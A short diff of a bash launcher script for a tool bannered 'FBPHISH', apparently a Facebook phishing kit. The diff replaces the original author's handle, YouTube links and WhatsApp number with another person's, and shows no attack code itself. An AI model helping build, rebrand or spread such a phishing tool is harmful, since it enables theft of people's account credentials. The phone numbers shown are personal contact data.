@@ -7,8 +7,8 @@ me='\033[31;1m' #merah
 pu='\033[37;1m' #putih
 ku='\033[33;1m' #kuning
 toilet -f future "FBPHISH" | lolcat
-echo $pur"author @ridrawan20"
-echo $pur"subscribe youtube.com/ridwanirawan"
+echo $pur"author @ady.denady"
+echo $pur"subscribe youtube.com/c/dnadofficial"
 python2 p.py
 clear
 echo $pur"____________________________________"
@@ -19,8 +19,8 @@ toilet -f term "    [\]_" | lolcat
 toilet -f term "    //   •       •" | lolcat
 toilet -f term "           •   •   •" | lolcat
 toilet -f term "             •       •" | lolcat
-echo $i "v.2 author @ridzwanirawan"
-echo $i "WA : 083890193922"
+echo $i "v.2 author @denady"
+echo $i "WA : 081937555636"
 echo $pur"____________________________________"
 sleep 1
 echo
@@ -111,7 +111,7 @@ echo
 echo
 echo $pur "Thanks For Using This Tool"
 sleep 2
-echo $ku "SUBSCRIBE MY CHANNEL www.youtube.com/ridwanirawan"
+echo $ku "SUBSCRIBE MY CHANNEL www.youtube.com/c/dnadofficial"
 echo
 sleep 1
 exit
